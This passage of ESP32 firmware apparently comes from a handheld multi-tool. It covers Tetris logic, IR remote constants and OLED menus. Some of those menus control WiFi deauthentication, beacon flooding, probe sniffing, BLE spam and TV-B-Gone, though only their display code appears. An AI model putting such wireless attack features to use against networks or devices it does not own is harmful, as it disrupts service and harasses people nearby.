    dasLastRepeat[0] = now;
    dasActive[0] = true;
    oledNeedsRedraw = true;
  }
  if (btnRightPressed) {
    tetrisHardDrop(); // hard drop - instant, no DAS
    dasActive[1] = false;
    oledNeedsRedraw = true;
  }
  if (btnDownPressed) {
    tetrisMovePiece(1, 0); // move right
    dasHoldStart[2] = now;
    dasLastRepeat[2] = now;
    dasActive[2] = true;
    oledNeedsRedraw = true;
  }
  if (btnUpPressed) {
    tetrisMovePiece(-1, 0); // move left
    dasHoldStart[3] = now;
    dasLastRepeat[3] = now;
    dasActive[3] = true;
    oledNeedsRedraw = true;
  }
  
  // DAS auto-repeat for held directions (except right = hard drop, no DAS)
  tetrisDasRepeat(0, 0, 1, (btnLeftState == LOW), false);   // Left held = soft drop
  tetrisDasRepeat(2, 1, 0, (btnDownState == LOW), false);   // Down held = move right
  tetrisDasRepeat(3, -1, 0, (btnUpState == LOW), false);    // Up held = move left
}

// ===================== TETRIS GAME LOOP =====================
void runTetrisLoop() {
  if (!tetris.started) return;
  
  unsigned long now = millis();
  
  // Auto-drop
  if (!tetris.paused && !tetris.gameOver) {
    if (now - tetris.lastDrop >= tetris.dropInterval) {
      tetris.lastDrop = now;
      if (!tetrisMovePiece(0, 1)) {
        // Can't move down - start lock delay
        if (!tetris.lockDelayActive) {
          tetris.lockDelayActive = true;
          tetris.lockDelayStart = now;
          tetris.lockDelayMax = 500;
        } else if (now - tetris.lockDelayStart >= tetris.lockDelayMax) {
          tetrisLockPiece();
          tetris.lastDrop = now;
          oledNeedsRedraw = true;
        }
      } else {
        tetris.lockDelayActive = false;
      }
      oledNeedsRedraw = true;
    }
    
    // If piece is sitting on ground and lock delay not started yet
    if (!tetris.lockDelayActive) {
      uint16_t shape = tetrisGetShape(tetris.pieceType, tetris.pieceRot);
      if (tetrisCollides(tetris.pieceX, tetris.pieceY + 1, shape)) {
        tetris.lockDelayActive = true;
        tetris.lockDelayStart = now;
        tetris.lockDelayMax = 500;
      }
    }
  }
}

// Gree AC constants / AC brand names
const char* greeModeNames[] = {"Cool", "Dry", "Fan", "Auto"};
const char* greeFanNames[] = {"Auto", "Low", "Med", "High"};
const int greeModeCount = 4;
const int greeFanCount = 4;
const char* acBrandNames[] = {"GREE", "COOLIX", "HAIER", "HAIER160", "KELVINATOR", "UNIVERSAL"};
const int acBrandCount = 6;

// Projector brand constants
const char* projBrandNames[] = {"BenQ", "Epson", "Optoma", "ViewSonic"};
const int projBrandCount = 4;
const uint32_t projPowerOn[] = {0x2FD3D00F, 0x41B68D72, 0x32CD02FD, 0x060620DF};
const uint32_t projPowerOff[] = {0x00C41BE4, 0x41B66D92, 0x32CD03FC, 0x0606A05F};

// ===================== OLED DRAWING PRIMITIVES ===============

// Draw a 12x12 XBM icon at (x,y). If inverted, draw white-on-black.
void oledDrawIcon(int x, int y, const unsigned char* icon, bool inverted) {
  for (int row = 0; row < 12; row++) {
    uint16_t bits = pgm_read_word(&((const uint16_t*)icon)[row]);
    for (int col = 0; col < 12; col++) {
      bool pixel = (bits >> (11 - col)) & 1;
      if (inverted) pixel = !pixel; // Invert for selection highlight
      if (pixel) u8g2.drawPixel(x + col, y + row);
    }
  }
}

// Draw a horizontal scrollbar on the right edge
void oledDrawScrollbar(int contentY, int contentH, int totalItems, int visibleItems, int scrollPos) {
  if (totalItems <= visibleItems) return;
  int barH = (contentH * visibleItems) / totalItems;
  if (barH < 4) barH = 4;
  int barY = contentY + (contentH - barH) * scrollPos / (totalItems - visibleItems);
  // Track background
  u8g2.drawVLine(126, contentY, contentH);
  // Thumb
  u8g2.drawBox(125, barY, 3, barH);
}

// Draw a selection-highlighted row with icon and text
void oledDrawIconRow(int y, const unsigned char* icon, const char* text, bool selected) {
  int iconX = 2;
  int textX = 16;
  
  if (selected) {
    // Inverted selection background
    u8g2.setDrawColor(1);
    u8g2.drawBox(0, y - 7, 128, 8);
    u8g2.setDrawColor(0);
    // Draw icon filled (inverted)
    if (icon) oledDrawIcon(iconX, y - 11, icon, true);
    // Draw text inverted
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.drawStr(textX, y, text);
    u8g2.setDrawColor(1); // restore
  } else {
    if (icon) oledDrawIcon(iconX, y - 11, icon, false);
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.drawStr(textX, y, text);
  }
}

// Draw a toggle row with icon
void oledDrawIconToggle(int y, const unsigned char* icon, const char* label, bool state, bool selected) {
  char buf[20];
  snprintf(buf, sizeof(buf), "%s %s", label, state ? "ON" : "OFF");
  oledDrawIconRow(y, icon, buf, selected);
}

// ===================== TOP BAR =====================
void oledDrawTopBar() {
  u8g2.setFont(u8g2_font_4x6_tf);
  char buf[12];
  
  // STA WiFi status text (Station connected?)
  snprintf(buf, sizeof(buf), "W:%s", WiFi.status() == WL_CONNECTED ? "ON" : "OFF");
  u8g2.drawStr(1, 8, buf);
  
  // AP Radio status text (2px after max W:OFF width)
  snprintf(buf, sizeof(buf), "A:%s", wifiEnabled ? "ON" : "OFF");
  u8g2.drawStr(23, 8, buf);
  
  // BT status text (2px after max A:OFF width)
  snprintf(buf, sizeof(buf), "B:%s", btEnabled ? "ON" : "OFF");
  u8g2.drawStr(45, 8, buf);
  
  // Uptime (right-aligned, before battery section)
  unsigned long up = millis() / 1000;
  char timebuf[10];
  snprintf(timebuf, sizeof(timebuf), "UP:%02lu:%02lu", up/3600, (up%3600)/60);
  u8g2.drawStr(67, 8, timebuf);
  
  // Right: Battery or USB-C
  if (isUsbPowered) {
    snprintf(buf, sizeof(buf), "USB");
    u8g2.drawStr(100, 8, buf);
  } else {
    // Draw battery frame
    u8g2.drawFrame(110, 1, 20, 8); // battery body
    u8g2.drawBox(130, 3, 2, 4);   // battery nub
    // Fill segments based on percentage
    int segs = (batteryPercent * 5) / 100;
    for (int i = 0; i < 5; i++) {
      if (i < segs) {
        u8g2.drawBox(112 + i * 3, 3, 2, 4);
      }
    }
  }
  
  // Separator line below top bar
  u8g2.drawHLine(0, OLED_TOP_BAR_H, 128);
}

// ===================== BOTTOM BAR (DISABLED) =====================
void oledDrawBottomBar() {
  // Intentionally empty - bottom bar removed from all pages
}

// Draw a scrollable list with icons (uses menuIcons if available, or just text)
void oledDrawIconList(int startY, const char* items[], int itemCount, int cursor, int8_t* scrollOffset, const unsigned char** icons) {
  int maxVisible = OLED_MAX_ITEMS;
  if (itemCount <= maxVisible) {
    *scrollOffset = 0;
  } else if (cursor < *scrollOffset) {
    *scrollOffset = cursor;
  } else if (cursor >= *scrollOffset + maxVisible) {
    *scrollOffset = cursor - maxVisible + 1;
  }
  
  int end = min(itemCount, *scrollOffset + maxVisible);
  int y = startY;
  for (int i = *scrollOffset; i < end; i++) {
    const unsigned char* icon = (icons && i < itemCount) ? icons[i] : nullptr;
    bool isBack = (i == itemCount - 1 && strcmp(items[i], "Back") == 0);
    oledDrawIconRow(y, icon ? icon : icon_back, items[i], i == cursor);
    y += 9;
  }
  
  // Scrollbar
  oledDrawScrollbar(startY - 7, (end - *scrollOffset) * 9, itemCount, maxVisible, *scrollOffset);
}

// Draw a simple title (used sparingly now, top bar replaces it)
void oledDrawTitle(const char* title) {
  u8g2.setFont(u8g2_font_5x7_tf);
  u8g2.drawStr(2, OLED_CONTENT_Y + 2, title);
}

// ===================== MAIN MENU CARD RENDERER =====================
void oledRenderMain() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  
  int page = oledState.mainMenuPage;
  int count = mainMenuCardCounts[page];
  
  // Card dimensions
  const int cardW = 38;
  const int cardH = 16;
  const int gapX = 5;
  const int gapY = 4;
  const int startX = 2;
  const int startY = OLED_CONTENT_Y + 2;
  
  // For each of the 2 rows x 3 cols
  int idx = 0;
  for (int row = 0; row < 2 && idx < count; row++) {
    for (int col = 0; col < 3 && idx < count; col++) {
      int x = startX + col * (cardW + gapX);
      int y = startY + row * (cardH + gapY);
      bool selected = (idx == oledState.cursor);
      
      // Draw card
      if (selected) {
        // Selected: filled background, inverted
        u8g2.setDrawColor(1);
        u8g2.drawBox(x, y, cardW, cardH);
        u8g2.setDrawColor(0);
        // Icon (inverted)
        if (mainMenuCardIcons[page][idx]) {
          oledDrawIcon(x + (cardW - 12) / 2, y + 1, mainMenuCardIcons[page][idx], true);
        }
        // Label (inverted)
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(x + (cardW - strlen(mainMenuCardLabels[page][idx]) * 5) / 2 + 1, y + cardH - 3, mainMenuCardLabels[page][idx]);
        u8g2.setDrawColor(1);
      } else {
        // Normal: border only
        u8g2.drawFrame(x, y, cardW, cardH);
        // Icon
        if (mainMenuCardIcons[page][idx]) {
          oledDrawIcon(x + (cardW - 12) / 2, y + 1, mainMenuCardIcons[page][idx], false);
        }
        // Label
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(x + (cardW - strlen(mainMenuCardLabels[page][idx]) * 5) / 2 + 1, y + cardH - 3, mainMenuCardLabels[page][idx]);
      }
      idx++;
    }
  }
  
  // Page indicator (tiny, tucked into right side of top bar area before battery)
  if (count > 0) {
    char pageBuf[4];
    snprintf(pageBuf, sizeof(pageBuf), "%d/2", page + 1);
    u8g2.setFont(u8g2_font_4x6_tf);
    u8g2.drawStr(124 - strlen(pageBuf) * 4, 7, pageBuf);
  }
  
  u8g2.sendBuffer();
}

// ===================== SCREEN RENDERERS =====================

void oledRenderWiFi() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("WiFi");
  oledDrawIconList(OLED_CONTENT_Y + 10, wifiMenuItems, wifiMenuItemCount, oledState.cursor, &oledState.scrollOffset, nullptr);
  u8g2.sendBuffer();
}

void oledRenderWiFiStatus() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[22];
  int y = OLED_CONTENT_Y + 2;
  
  // SSID with icon
  oledDrawIcon(y - 7, 0, icon_wifi_sta_on, false);
  snprintf(buf, sizeof(buf), "SSID:%s", apSsid.substring(0, 14).c_str());
  u8g2.drawStr(14, y, buf);
  y += 10;
  
  String ipStr = (WiFi.status() == WL_CONNECTED) ? WiFi.localIP().toString() : WiFi.softAPIP().toString();
  snprintf(buf, sizeof(buf), "IP:%s", ipStr.c_str());
  u8g2.drawStr(0, y, buf);
  y += 9;
  
  snprintf(buf, sizeof(buf), "Mode:%s", (WiFi.getMode() & WIFI_MODE_STA) ? "STA+AP" : "AP");
  u8g2.drawStr(0, y, buf);
  y += 9;
  
  wifi_sta_list_t staList;
  esp_wifi_ap_get_sta_list(&staList);
  snprintf(buf, sizeof(buf), "Clients:%d", staList.num);
  u8g2.drawStr(0, y, buf);
  y += 9;
  
  if (WiFi.status() == WL_CONNECTED) {
    snprintf(buf, sizeof(buf), "RSSI:%d dBm", WiFi.RSSI());
    u8g2.drawStr(0, y, buf);
  }
  
  
  u8g2.sendBuffer();
}

// Cached scan results to avoid blocking in render function
int cachedScanCount = 0;
String cachedScanResults[20]; // Store up to 20 network SSIDs
int cachedScanRssi[20];
unsigned long lastScanTime = 0;

void oledRenderWiFiScan() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  
  // Only actually scan when CENTER button is pressed (signaled by cursor being non-scrolling)
  // or if cache is stale (>30 seconds old)
  unsigned long now = millis();
  if (now - lastScanTime > 30000 || (oledState.scrollOffset == -1)) {
    // Show "Scanning..." and send buffer so user sees feedback immediately
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.drawStr(0, OLED_CONTENT_Y + 12, "Scanning WiFi...");
    oledDrawBottomBar();
    u8g2.sendBuffer();
    
    // Perform blocking scan
    int n = WiFi.scanNetworks();
    if (n < 0) n = 0;
    int count = min(n, 20);
    cachedScanCount = count;
    for (int i = 0; i < count; i++) {
      cachedScanResults[i] = WiFi.SSID(i);
      cachedScanRssi[i] = WiFi.RSSI(i);
    }
    WiFi.scanDelete();
    lastScanTime = now;
    // Reset the scrollOffset flag
    if (oledState.scrollOffset == -1) oledState.scrollOffset = 0;
  }
  
  // Now draw the cached results on a clean buffer
  u8g2.clearBuffer();
  oledDrawTopBar();
  
  int n = cachedScanCount;
  char buf[24];
  snprintf(buf, sizeof(buf), "Scan(%d)", n);
  oledDrawTitle(buf);
  
  int startIdx = oledState.scrollOffset;
  int visible = min(n, OLED_MAX_ITEMS);
  if (oledState.cursor >= startIdx + visible) startIdx = oledState.cursor - visible + 1;
  if (oledState.cursor < startIdx) startIdx = oledState.cursor;
  if (startIdx < 0) startIdx = 0;
  
  int y = OLED_CONTENT_Y + 12;
  for (int i = startIdx; i < min(n, startIdx + visible); i++) {
    bool sel = (i == oledState.cursor);
    if (sel) {
      u8g2.setDrawColor(1);
      u8g2.drawBox(0, y - 8, 128, 8);
      u8g2.setDrawColor(0);
    }
    u8g2.drawStr(0, y, cachedScanResults[i].substring(0, 15).c_str());
    snprintf(buf, sizeof(buf), "%d dBm", cachedScanRssi[i]);
    int x = 128 - strlen(buf) * 5;
    u8g2.drawStr(x, y, buf);
    if (sel) u8g2.setDrawColor(1);
    y += 10;
  }
  
  oledDrawScrollbar(OLED_CONTENT_Y + 10, y - OLED_CONTENT_Y - 10, n, visible, startIdx);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.sendBuffer();
}

void oledRenderBT() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Bluetooth");
  oledDrawIconList(OLED_CONTENT_Y + 10, btMenuItems, btMenuItemCount, oledState.cursor, &oledState.scrollOffset, nullptr);
  u8g2.sendBuffer();
}

void oledRenderBTScan() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  
  String scanJson = performBleScan();
  
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("BT Devices");
  
  DynamicJsonDocument doc(4096);
  DeserializationError err = deserializeJson(doc, scanJson);
  int devCount = 0;
  if (!err) devCount = doc.size();
  
  int startIdx = oledState.scrollOffset;
  int visible = min(devCount, OLED_MAX_ITEMS);
  if (oledState.cursor >= startIdx + visible) startIdx = oledState.cursor - visible + 1;
  if (oledState.cursor < startIdx) startIdx = oledState.cursor;
  if (startIdx < 0) startIdx = 0;
  
  int y = OLED_CONTENT_Y + 12;
  char buf[24];
  for (int i = startIdx; i < min(devCount, startIdx + visible); i++) {
    const char* devName = doc[i]["name"] | "Unknown";
    int rssi = doc[i]["rssi"] | 0;
    bool sel = (i == oledState.cursor);
    if (sel) {
      u8g2.setDrawColor(1);
      u8g2.drawBox(0, y - 8, 128, 8);
      u8g2.setDrawColor(0);
    }
    u8g2.drawStr(0, y, devName);
    snprintf(buf, sizeof(buf), "%d dBm", rssi);
    int x = 128 - strlen(buf) * 5;
    u8g2.drawStr(x, y, buf);
    if (sel) u8g2.setDrawColor(1);
    y += 10;
  }
  
  oledDrawScrollbar(OLED_CONTENT_Y + 10, y - OLED_CONTENT_Y - 10, devCount, visible, startIdx);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.sendBuffer();
}

void oledRenderBTPaired() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Paired");
  u8g2.setFont(u8g2_font_5x7_tf);
  
  String pairedJson = getPairedDevicesJson();
  DynamicJsonDocument doc(2048);
  DeserializationError err = deserializeJson(doc, pairedJson);
  int devCount = 0;
  if (!err) devCount = doc.size();
  
  int y = OLED_CONTENT_Y + 2;
  char buf[24];
  if (devCount == 0) {
    u8g2.drawStr(0, y, "No paired devices");
  } else {
    int startIdx = oledState.scrollOffset;
    int visible = min(devCount, OLED_MAX_ITEMS);
    if (oledState.cursor >= startIdx + visible) startIdx = oledState.cursor - visible + 1;
    if (oledState.cursor < startIdx) startIdx = oledState.cursor;
    if (startIdx < 0) startIdx = 0;
    
    for (int i = startIdx; i < min(devCount, startIdx + visible); i++) {
      const char* name = doc[i]["name"] | "Unknown";
      bool sel = (i == oledState.cursor);
      if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
      u8g2.drawStr(0, y, name);
      if (sel) u8g2.setDrawColor(1);
      y += 9;
    }
    oledDrawScrollbar(OLED_CONTENT_Y, y - OLED_CONTENT_Y, devCount, visible, startIdx);
  }
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.sendBuffer();
}

void oledRenderAttacks() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("WiFi Attacks");
  oledDrawIconList(OLED_CONTENT_Y + 10, attacksMenuItems, attacksMenuItemCount, oledState.cursor, &oledState.scrollOffset, nullptr);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderDeauth() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Deauth");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  snprintf(buf, sizeof(buf), " %s %s", deauthRunning ? ">>" : "  ", deauthRunning ? "ACTIVE" : "OFF");
  if (oledState.cursor == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 0) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " CH:%d", deauthChannel);
  if (oledState.cursor == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 1) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " Rate:%dms", deauthRate);
  if (oledState.cursor == 2) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 2) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " AllCH:%s", deauthAllChannels ? "YES" : "NO");
  if (oledState.cursor == 3) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 3) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " [%s]", deauthRunning ? "STOP" : "START");
  if (oledState.cursor == 4) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 4) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderBeacon() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Beacon");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  snprintf(buf, sizeof(buf), " %s %s", beaconRunning ? ">>" : "  ", beaconRunning ? "ACTIVE" : "OFF");
  if (oledState.cursor == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 0) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " Count:%d", beaconCount);
  if (oledState.cursor == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 1) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " Enc:%s", beaconEncryption.c_str());
  if (oledState.cursor == 2) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 2) u8g2.setDrawColor(1);
  
  y += 9;
  snprintf(buf, sizeof(buf), " [%s]", beaconRunning ? "STOP" : "START");
  if (oledState.cursor == 4) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 4) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderHop() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Ch Hop");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  snprintf(buf, sizeof(buf), " %s %s", channelHoppingRunning ? ">>" : "  ", channelHoppingRunning ? "ACTIVE" : "OFF");
  if (oledState.cursor == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 0) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), "  Cur: %d", currentHopChannel);
  u8g2.drawStr(0, y, buf);
  y += 9;
  
  snprintf(buf, sizeof(buf), " [%s]", channelHoppingRunning ? "STOP" : "START");
  if (oledState.cursor == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 1) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderProbe() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Probe Sniff");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  snprintf(buf, sizeof(buf), " %s %s", probeSniffing ? ">>" : "  ", probeSniffing ? "ACTIVE" : "OFF");
  if (oledState.cursor == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 0) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), "  Captured: %d", probeResultCount);
  u8g2.drawStr(0, y, buf);
  y += 9;
  
  snprintf(buf, sizeof(buf), " [%s]", probeSniffing ? "STOP" : "START");
  if (oledState.cursor == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 1) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

void oledRenderBLESpam() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("BLE Spam");
  
  int y = OLED_CONTENT_Y + 2;
  int startIdx = oledState.scrollOffset;
  int visible = min(bleSpamItemCount - 1, OLED_MAX_ITEMS);
  if (oledState.cursor >= startIdx + visible) startIdx = oledState.cursor - visible + 1;
  if (oledState.cursor < startIdx) startIdx = oledState.cursor;
  if (startIdx < 0) startIdx = 0;
  
  for (int i = startIdx; i < min(bleSpamItemCount - 1, startIdx + visible); i++) {
    bool state = false;
    switch (i) {
      case 0: state = airtagSpamRunning; break;
      case 1: state = smarttagSpamRunning; break;
      case 2: state = swiftpairSpamRunning; break;
      case 3: state = googleFastPairRunning; break;
      case 4: state = ibeaconRunning; break;
      case 5: state = eddystoneRunning; break;
      case 6: state = bleSpamRunning; break;
      case 7: state = bleNameRandomizerRunning; break;
    }
    char buf[22];
    snprintf(buf, sizeof(buf), "%s %s", bleSpamItems[i], state ? "ON" : "OFF");
    bool sel = (i == oledState.cursor);
    if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
    u8g2.drawStr(2, y, buf);
    if (sel) u8g2.setDrawColor(1);
    y += 9;
  }
  
  // STOP ALL button
  int stopIdx = bleSpamItemCount - 2;
  if (stopIdx >= startIdx && stopIdx < startIdx + visible) {
    // already drawn above
  }
  
  int backIdx = bleSpamItemCount - 1;
  if (backIdx >= startIdx && backIdx < startIdx + visible) {
    bool sel = (backIdx == oledState.cursor);
    if (sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
    u8g2.drawStr(2, y, "Back");
    if (sel) u8g2.setDrawColor(1);
  }
  
  oledDrawScrollbar(OLED_CONTENT_Y, y - OLED_CONTENT_Y, bleSpamItemCount, visible, startIdx);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.sendBuffer();
}

void oledRenderIR() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("IR Control");
  oledDrawIconList(OLED_CONTENT_Y + 10, irMenuItems, irMenuItemCount, oledState.cursor, &oledState.scrollOffset, nullptr);
  
  u8g2.sendBuffer();
}

void oledRenderIRSend() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("Send IR");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  snprintf(buf, sizeof(buf), "Last:%s", lastIrProtocol.c_str());
  u8g2.drawStr(0, y, buf); y += 9;
  snprintf(buf, sizeof(buf), "Hex:0x%s", lastIrValue.c_str());
  u8g2.drawStr(0, y, buf); y += 9;
  
  snprintf(buf, sizeof(buf), " RESEND");
  if (oledState.cursor == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 0) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " Samsung Pwr");
  if (oledState.cursor == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 1) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " LG AC Pwr");
  if (oledState.cursor == 2) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 2) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
}

// ===================== ACs PANEL WITH BRAND SELECTOR =====================
void oledRenderGree() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("ACs");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  snprintf(buf, sizeof(buf), " Brand %s", acBrandNames[oledState.acBrand]);
  if (oledState.greeField == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.greeField == 0) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " Power %s", oledState.greePower ? "ON" : "OFF");
  if (oledState.greeField == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.greeField == 1) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " Temp %dC", oledState.greeTemp);
  if (oledState.greeField == 2) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.greeField == 2) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " Mode %s", greeModeNames[oledState.greeMode]);
  if (oledState.greeField == 3) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.greeField == 3) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " Fan %s", greeFanNames[oledState.greeFan]);
  if (oledState.greeField == 4) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.greeField == 4) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " [SEND]");
  if (oledState.greeField == 5) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.greeField == 5) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " [Back]");
  if (oledState.greeField == 6) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.greeField == 6) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.sendBuffer();
}

void oledRenderTVBgone() {
  u8g2.clearBuffer();
  oledDrawTopBar();
  oledDrawTitle("TV-B-Gone");
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  int y = OLED_CONTENT_Y + 2;
  
  snprintf(buf, sizeof(buf), " %s %s", tvbgoneRunning ? ">>" : "  ", tvbgoneRunning ? "ACTIVE" : "OFF");
  if (oledState.cursor == 0) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 0) u8g2.setDrawColor(1);
  y += 9;
  
  snprintf(buf, sizeof(buf), " [%s]", tvbgoneRunning ? "STOP" : "START");
  if (oledState.cursor == 1) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 7, 128, 8); u8g2.setDrawColor(0); }
  u8g2.drawStr(0, y, buf); if (oledState.cursor == 1) u8g2.setDrawColor(1);
  
  u8g2.setFont(u8g2_font_4x6_tf);
  oledDrawBottomBar();
  u8g2.sendBuffer();
